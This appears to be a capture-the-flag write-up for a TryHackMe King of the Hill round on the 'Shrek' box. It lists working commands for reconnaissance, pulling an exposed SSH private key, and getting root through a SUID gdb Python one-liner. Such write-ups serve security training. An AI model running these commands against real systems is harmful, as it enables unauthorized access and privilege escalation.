KOTH: Shrek

TryHackMe King of the Hill. CIAT Cybersecurity Club live competition on the Shrek box. Earn points by writing your name to /root/king.txt, then defend it. An RSA key exposed over HTTP and SUID gdb got me there.

King of the Hill. CIAT Cybersecurity Club ran this as a live competition on the Shrek box. Two coaches, one student group. The rules: earn points by writing your name to /root/king.txt, then defend it.

The second coach rooted the first instance so fast no one could track the moves. I realized the KOTH objective was at the bottom of the players list rather than where everyone expected it. Coach reset the box. In the second round, students were given a fighting chance. Then the primary coach proceeded to do laps around everyone once the student portion was complete.

Two things learned about KOTH before you start:

  1. Do not echo the flag into the void. The box cannot see you. Your name goes in /root/king.txt.
  2. The box kept kicking me out. I don't know why.

I am officially hooked on this.

Reconnaissance

nmap -sV -A -T4 TARGET_IP

Open ports:

  • 21/tcp FTP (vsftpd 3.0.2)
  • 22/tcp SSH (OpenSSH 7.4)
  • 80/tcp HTTP (Apache 2.4.6, CentOS, PHP/7.1.33)
  • 3306/tcp MySQL (unauthorized)
  • 8009/tcp AJP (Apache Jserv 1.3)
  • 8080/tcp HTTP (Apache Tomcat 7.0.88)
  • 9999/tcp HTTP (Golang net/http)

Seven open ports. Tomcat on 8080 is the first thing to check. Default credentials (tomcat:tomcat, admin:admin, tomcat:s3cret) all fail.

Moving on.

Web enumeration

robots.txt disclosing a file path is the classic robots.txt behavior in CTF environments:

curl -s http://TARGET_IP/robots.txt
Disallow: /Cpxtpt2hWCee9VFa.txt

Whatever that file is, it wasn’t meant to be found. That means it was definitely meant to be found.

curl -s http://TARGET_IP/

The homepage is a fullscreen image of Shrek. The source contains two HTML comments:

<!-- shrek is like an onion -->
<!-- NzM2ODcyNjU2bzY5NzM2MTZzNnI2OTZzNnI= -->

The Base64 string decodes to a garbled, hex-like value. The “shrek is like an onion” comment makes shrek worth trying as a username. We'll see if the key gets us in.

I tried anonymous FTP. The server rejected the login:

ftp TARGET_IP

Feroxbuster on port 9999 finds two endpoints:

feroxbuster -u http://TARGET_IP:9999 -w /usr/share/wordlists/dirb/common.txt

Notable: /migration and /plate. Both returned bambrose. I tested that name with the key, but it didn't get me in.

RSA key extraction

The disallowed file is an RSA private key:

curl -s http://TARGET_IP/Cpxtpt2hWCee9VFa.txt -o id_rsa

The downloaded key has blank lines between its PEM lines, and OpenSSH will not parse it in that state. The fix:

sed -i '/^[[:space:]]*$/d' id_rsa
chmod 600 id_rsa

Validate before attempting SSH:

ssh-keygen -y -f id_rsa >/dev/null && echo "KEY VALID"

That rebuilt it into a contiguous RSA PEM file and satisfied the private key permission check.

Initial access

ssh -i ./id_rsa -o IdentitiesOnly=yes shrek@TARGET_IP

We're in as shrek. The connection closed shortly afterward. I reconnected and kept going.

Back in:

ls -la
cat flag.txt

flag.txt is in shrek's home directory. Found it.

check.sh belongs to shrek and sits in the same directory:

cat check.sh
#!/bin/bash
date > /tmp/timecheck

It writes the current time to /tmp/timecheck. I checked the cron files for a reference to check.sh and found none. No correlation to the closed SSH sessions yet.

Privilege escalation via SUID gdb

Enumerate SUID binaries:

find / -perm -4000 -type f 2>/dev/null

/usr/bin/gdb has the SUID bit set. gdb has Python support. Hand me the light because this is the path.

gdb -nx -ex 'python import os; os.setuid(0); os.execl("/bin/bash","bash","-p")' -ex quit

This command launches gdb and uses its embedded Python to call setuid(0). It then replaces the process with a privileged Bash shell. gdb runs with root’s effective user ID via the SUID bit, making the magic happen.

ROOT.

id confirmed the privileged shell:

uid=0(root) gid=1000(shrek) egid=0(root) groups=0(root),1000(shrek)

Root shell confirmed. /root/root.txt is ours to read.

All four flag files

From the root shell:

find /home /root -type f \( -iname '*flag*' -o -iname 'user.txt' -o -iname 'root.txt' \) -ls 2>/dev/null
cat /home/shrek/flag.txt
cat /home/donkey/flag.txt
cat /home/puss/flag.txt
cat /root/root.txt

Taking the hill

The flags are separate from the KOTH objective. With root access, I wrote my name to /root/king.txt and read it back:

echo 'jenn.notabot' > /root/king.txt
cat /root/king.txt

It returned jenn.notabot more than once before the connection closed. My name made it into king.txt. I can't tell from these screenshots how long it stayed there.

Full Attack Chain

Nmap
  -> 7 open ports: FTP, SSH, HTTP/80, MySQL, AJP, Tomcat/8080, Golang/9999
  -> Tomcat default creds: all fail
  -> robots.txt: Cpxtpt2hWCee9VFa.txt disclosed
  -> homepage comment: "shrek is like an onion"; Base64 output was garbled
  -> /migration and /plate returned bambrose, but that username did not get me in
  -> anonymous FTP login failed
  -> Cpxtpt2hWCee9VFa.txt: RSA private key (blank lines between PEM lines)
  -> sed fix: removed blank lines, chmod 600, validated with ssh-keygen
  -> SSH as shrek with fixed key
  -> SSH login confirmed shrek as the working username
  -> find SUID: /usr/bin/gdb
  -> gdb Python setuid(0) + execl bash: root shell
  -> four flag files located
  -> wrote jenn.notabot to /root/king.txt and read it back
